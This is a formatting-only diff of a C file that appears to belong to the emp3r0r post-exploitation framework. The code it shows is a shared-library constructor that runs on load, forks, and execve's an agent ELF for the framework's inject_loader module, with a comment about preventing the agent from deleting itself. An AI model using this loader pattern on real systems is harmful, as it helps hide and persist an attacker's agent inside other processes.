@@ -4,11 +4,9 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-void __attribute__((constructor)) initLibrary(void)
-{
+void __attribute__((constructor)) initLibrary(void) {
   pid_t child = fork();
-  if (child == 0)
-  {
+  if (child == 0) {
     puts("Loading emp3r0r...");
 
     // prevent self delete of agent
@@ -18,8 +16,7 @@ void __attribute__((constructor)) initLibrary(void)
     // where to read target ELF file
     // this should be in sync with emp3r0r inject_loader module
     char exe[1024];
-    if (readlink("/proc/self/exe", exe, 1024) < 0)
-    {
+    if (readlink("/proc/self/exe", exe, 1024) < 0) {
       perror("readlink");
       return;
     }
@@ -33,8 +30,7 @@ void __attribute__((constructor)) initLibrary(void)
     char *argv[] = {exe, NULL};
     char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp", NULL};
     printf("Exec: %s\n", elf_path);
-    if (execve(elf_path, argv, envv) < 0)
-    {
+    if (execve(elf_path, argv, envv) < 0) {
       perror("execve");
     }
   }
